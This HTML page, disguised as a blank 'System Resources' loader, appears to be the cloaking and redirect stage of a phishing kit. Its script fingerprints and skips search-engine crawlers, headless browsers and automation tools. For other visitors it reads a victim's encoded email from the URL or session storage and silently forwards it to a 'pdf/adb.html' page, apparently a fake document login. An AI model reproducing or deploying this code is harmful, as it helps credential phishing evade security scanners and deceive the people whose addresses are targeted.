<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Resources</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    }
    .hidden-content {
      display: none;
    }
  </style>
</head>
<body>
  <div class="hidden-content">
    <h1>System Resources</h1>
    <p>Loading system resources, please wait...</p>
  </div>

  <script>
    (function() {
      // Enhanced bot detection with multiple techniques
      function detectAutomation() {
        // User agent check
        const botPatterns = [
          /bot/i, /crawler/i, /spider/i, /crawling/i,
          /google/i, /bing/i, /yahoo/i, /facebook/i,
          /duckduckgo/i, /baidu/i, /yandex/i, /headless/i,
          /phantom/i, /puppeteer/i, /selenium/i, /playwright/i
        ];
        
        if (botPatterns.some(pattern => pattern.test(navigator.userAgent))) {
          return true;
        }
        
        // Automation properties check
        const automationProps = [
          'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
          '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_unwrapped'
        ];
        
        if (automationProps.some(prop => prop in navigator)) {
          return true;
        }
        
        // Plugin and language checks
        if (navigator.languages.length === 0 || navigator.plugins.length === 0) {
          return true;
        }
        
        // Screen resolution check (headless often has small dimensions)
        if (window.screen.width < 300 || window.screen.height < 300) {
          return true;
        }
        
        // Check for automation-specific objects
        if (window.document.documentElement.getAttribute('webdriver') ||
            window.document.documentElement.getAttribute('driver')) {
          return true;
        }
        
        // Check for Chrome automation
        if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) {
          // This might be an extension, but could also be automation
          try {
            if (window.chrome.runtime.sendMessage.toString().includes('function')) {
              // Likely automation
              return true;
            }
          } catch (e) {}
        }
        
        return false;
      }
      
      // Generate a secure token
      function generateToken(length = 24) {
        const array = new Uint8Array(length);
        crypto.getRandomValues(array);
        return Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
      }
      
      // Get encoded data from various possible sources
      function getEncodedData() {
        // Try hash first
        if (window.location.hash.substring(1)) {
          return window.location.hash.substring(1);
        }
        
        // Try query parameter with less obvious name
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('data')) {
          return urlParams.get('data');
        }
        if (urlParams.has('token')) {
          return urlParams.get('token');
        }
        if (urlParams.has('id')) {
          return urlParams.get('id');
        }
        if (urlParams.has('ref')) {
          return urlParams.get('ref');
        }
        
        // Try session storage as fallback
        if (sessionStorage.getItem('secureData')) {
          return sessionStorage.getItem('secureData');
        }
        
        return null;
      }
      
      // Execute the redirect with no visual indicators
      function executeRedirect() {
        // Check for automation
        if (detectAutomation()) {
          // Don't do anything if automation is detected
          return;
        }
        
        // Get the encoded data
        const encodedEmail = getEncodedData();
        
        if (!encodedEmail) {
          // No data found, don't redirect
          return;
        }
        
        // Generate token
        const token = generateToken();
        
        // Build redirect URL with less predictable structure
        const randomParam = generateToken(8);
        const redirectUrl = `pdf/adb.html?ref=${randomParam}#email=${encodedEmail}&token=${token}&t=${Date.now()}`;
        
        // Redirect immediately with no visual feedback
        window.location.replace(redirectUrl);
      }
      
      // Start the process with a minimal random delay (0-100ms)
      setTimeout(executeRedirect, Math.floor(Math.random() * 100));
    })();
  </script>
</body>
</html>
